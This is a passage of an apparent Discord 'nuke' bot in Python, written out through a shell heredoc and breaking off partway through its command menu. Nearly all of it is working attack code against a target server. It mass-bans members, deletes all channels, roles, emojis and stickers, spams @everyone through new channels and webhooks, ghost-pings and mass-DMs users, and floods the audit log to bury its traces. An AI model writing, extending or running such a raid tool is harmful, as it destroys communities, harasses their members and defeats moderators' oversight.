cat << 'EOF' > nuke.py
import discord
from discord.ext import commands
import asyncio
import sys
import aioconsole

intents = discord.Intents.all()
intents.members = True
bot = commands.Bot(command_prefix="!", intents=intents)
target_guild_id = None

R, G, Y, B, C, W, RESET = "\033[1;31m", "\033[1;32m", "\033[1;33m", "\033[1;34m", "\033[1;36m", "\033[1;37m", "\033[0m"

ban_semaphore = asyncio.Semaphore(50)
channel_semaphore = asyncio.Semaphore(10)

@bot.event
async def on_ready():
    print(f"\n{G}[+] Logged in as {bot.user.name} | 14-in-1 Engine Activated!{RESET}")
    bot.loop.create_task(termux_panel())

async def fast_ban_worker(guild, member):
    async with ban_semaphore:
        if member != bot.user and not member.guild_permissions.administrator:
            try: await guild.ban(member, reason="Nuked", delete_message_days=0)
            except: pass

async def fast_nick_worker(member, nick_name):
    async with ban_semaphore:
        if member != bot.user and not member.guild_permissions.administrator:
            try: await member.edit(nick=nick_name)
            except: pass

async def fast_dm_worker(member, dm_msg):
    async with ban_semaphore:
        if member != bot.user:
            try: await member.send(dm_msg)
            except: pass

async def fast_channel_worker(guild, name, message, msg_count, index, use_webhook):
    async with channel_semaphore:
        try:
            channel = await guild.create_text_channel(name=f"{name}-{index}")
            print(f"{G}[+] Created Channel: {channel.name}{RESET}")
            if use_webhook:
                try:
                    webhook = await channel.create_webhook(name="Captain Jack")
                    for _ in range(msg_count):
                        await webhook.send(f"@everyone {message}", username="MOD NUKER")
                        await asyncio.sleep(0.1)
                except: pass
            else:
                for _ in range(msg_count):
                    await channel.send(f"@everyone {message}")
                    await asyncio.sleep(0.3)
        except: pass

async def ghost_ping_worker(guild, name, count, index):
    async with channel_semaphore:
        try:
            channel = await guild.create_text_channel(name=f"{name}-{index}")
            print(f"{G}[+] Created Ghost Channel: {channel.name}{RESET}")
            for _ in range(count):
                try:
                    msg = await channel.send("@everyone GHOST PING INJECTED!")
                    await msg.delete()
                    await asyncio.sleep(0.1)
                except: break
        except: pass

async def audit_flood_worker(guild, index):
    async with ban_semaphore:
        try:
            role = await guild.create_role(name=f"Junk-{index}")
            await role.edit(name=f"Trash-{index}", reason="Flooding Audit Logs...")
            await role.delete()
            print(f"{C}[+] Audit Log Flooded Layer {index+1}{RESET}")
        except: pass

async def fast_channel_delete_worker(channel):
    async with channel_semaphore:
        try: await channel.delete()
        except: pass

async def unban_worker(guild, user):
    async with ban_semaphore:
        try: await guild.unban(user)
        except: pass

async def start_mass_ban(guild):
    if not guild.chunked: await guild.chunk()
    tasks = [fast_ban_worker(guild, m) for m in guild.members]
    await asyncio.gather(*tasks)
    print(f"\n{G}[+] Turbo Mass Ban operation complete!{RESET}")
    display_menu()

async def start_channel_delete(guild):
    tasks = [fast_channel_delete_worker(c) for c in guild.channels]
    await asyncio.gather(*tasks)
    print(f"\n{G}[+] All channels vaporized successfully!{RESET}")
    display_menu()

async def start_channel_create_spam(guild, c_name, c_msg, channel_count, spam_count, use_webhook=False):
    tasks = [fast_channel_worker(guild, c_name, c_msg, spam_count, i, use_webhook) for i in range(channel_count)]
    await asyncio.gather(*tasks)
    print(f"\n{G}[+] Channel Creation & Spam burst ended!{RESET}")
    display_menu()

async def start_ghost_ping_storm(guild, c_name, channel_count, ping_count):
    tasks = [ghost_ping_worker(guild, c_name, ping_count, i) for i in range(channel_count)]
    await asyncio.gather(*tasks)
    print(f"\n{G}[+] Ghost Ping Storm execution completed!{RESET}")
    display_menu()

async def start_audit_flood(guild, flood_intensity):
    print(f"\n{Y}[*] Launching Audit Log Trash Flood (Intensity: {flood_intensity})...{RESET}")
    tasks = [audit_flood_worker(guild, i) for i in range(flood_intensity)]
    await asyncio.gather(*tasks)
    print(f"\n{G}[+] Audit Log successfully jammed and logs trashed!{RESET}")
    display_menu()

async def start_nickname_override(guild, nick_name):
    if not guild.chunked: await guild.chunk()
    tasks = [fast_nick_worker(m, nick_name) for m in guild.members]
    await asyncio.gather(*tasks)
    print(f"\n{G}[+] Mass Nickname modified for all users!{RESET}")
    display_menu()

async def start_dm_blast(guild, dm_msg):
    if not guild.chunked: await guild.chunk()
    tasks = [fast_dm_worker(m, dm_msg) for m in guild.members]
    await asyncio.gather(*tasks)
    print(f"\n{G}[+] Mass DM distribution queue empty!{RESET}")
    display_menu()

async def start_mass_unban(guild):
    try:
        bans = [entry async for entry in guild.bans()]
        tasks = [unban_worker(guild, ban_entry.user) for ban_entry in bans]
        await asyncio.gather(*tasks)
        print(f"\n{G}[+] Mass Unban operations finished!{RESET}")
    except: pass
    display_menu()

async def start_asset_vaporize(guild):
    for emoji in guild.emojis:
        try: await emoji.delete()
        except: pass
    for sticker in guild.stickers:
        try: await sticker.delete()
        except: pass
    print(f"\n{G}[+] Emojis and Stickers completely wiped!{RESET}")
    display_menu()

def display_menu():
    print("\n" + f"{B}="*55 + f"{RESET}")
    print(f"{R}      __  __  ____  _____    _   _ _    _ _  _______ _   _  _____  ")
    print(r"     |  \/  |/ __ \|  __ \  | \ | | |  | | |/ /_   _| \ | |/ ____| ")
    print(r"     | \  / | |  | | |  | | |  \| | |  | | ' /  | | |  \| | |  __  ")
    print(r"     | |\/| | |  | | |  | | | . ` | |  | |  <   | | | . ` | | |_ | ")
    print(r"     | |  | | |__| | |__| | | |\  | |__| | . \ _| |_| |\  | |__| | ")
    print(r"     |_|  |_|\____/|_____/  |_| \_|\____/|_|\_\_____|_| \_|\_____| ")
    print(f"{RESET}{B}="*55 + f"{RESET}")
    print(f"{C}1. Turbo Mass Ban             2. Force Delete Channels{RESET}")
    print(f"{C}3. Instant Delete All Roles   4. Hyper Channel Create & Spam{RESET}")
    print(f"{C}5. Mass Nickname Changer      6. Vaporize Server Identity{RESET}")
    print(f"{C}7. Mass DM Blast              8. Webhook Multicast Spam{RESET}")
    print(f"{Y}9. GHOST PING STORM (New)     10. AUDIT LOG TRASH FLOOD (New){RESET}")
    print(f"{C}11. Prune Members (Kick Inact)12. Mass Unban All Members{RESET}")
    print(f"{C}13. Vaporize Emojis/Stickers  14. Exit Tool{RESET}")
    print(f"{B}-"*55 + f"{RESET}")

async def termux_panel():
    global target_guild_id
    await bot.wait_until_ready()
    print("\n" + f"{R}="*55 + f"{RESET}")
    print(f"{Y}             MOD NUKING 14-IN-1 ULTIMATE SUITE          {RESET}")
    print(f"{R}="*55 + f"{RESET}")
    while True:
        try:
            g_id = (await aioconsole.ainput(f"\n{W}Enter Target Server (Guild) ID: {RESET}")).strip()
            guild = bot.get_guild(int(g_id))
            if guild:
                target_guild_id = int(g_id)
                print(f"{G}[+] Target Connected: {guild.name}{RESET}")
                break
            else: print(f"{R}[-] Server paowa jayni!{RESET}")
        except ValueError: print(f"{R}[-] Valid ID likhun!{RESET}")
    display_menu()
    while True:
        choice = (await aioconsole.ainput(f"{Y}Select an option (1-14): {RESET}")).strip()
        guild = bot.get_guild(target_guild_id)
        if not guild: continue
        if choice == "1": bot.loop.create_task(start_mass_ban(guild))
        elif choice == "2": bot.loop.create_task(start_channel_delete(guild))
        elif choice == "3":
            async def del_rl(role):
                try: await role.delete()
                except: pass
            tasks = [del_rl(r) for r in guild.roles if r != guild.default_role and r < guild.me.top_role]
            bot.loop.create_task(asyncio.gather(*tasks))
            print(f"{G}[+] Role destruction running in background!{RESET}"); display_menu()
        elif choice == "4":
            c_name = (await aioconsole.ainput(f"{W}Enter Channel Name: {RESET}")).strip()
            c_msg = (await aioconsole.ainput(f"{W}Enter Spam Message: {RESET}")).strip()
            try: channel_count = int((await aioconsole.ainput(f"{W}How many channels?: {RESET}")).strip())
            except: channel_count = 30
            try: spam_count = int((await aioconsole.ainput(f"{W}Spam count per channel?: {RESET}")).strip())
            except: spam_count = 5
            bot.loop.create_task(start_channel_create_spam(guild, c_name, c_msg, channel_count, spam_count, False))
            print(f"{G}[+] Channel creation & text spam active!{RESET}")
        elif choice == "5":
            n_name = (await aioconsole.ainput(f"{W}Enter Custom Nickname: {RESET}")).strip()
            bot.loop.create_task(start_nickname_override(guild, n_name))
            print(f"{G}[+] Nickname modification active!{RESET}")
        elif choice == "6":
            try: await guild.edit(name="NUKED BY MOD", icon=None, banner=None, splash=None, verification_level=discord.VerificationLevel.none)
            except: pass
            print(f"{G}[+] Server Identity smashed!{RESET}"); display_menu()
        elif choice == "7":
            d_msg = (await aioconsole.ainput(f"{W}Enter Text Message to DM: {RESET}")).strip()
            bot.loop.create_task(start_dm_blast(guild, d_msg))
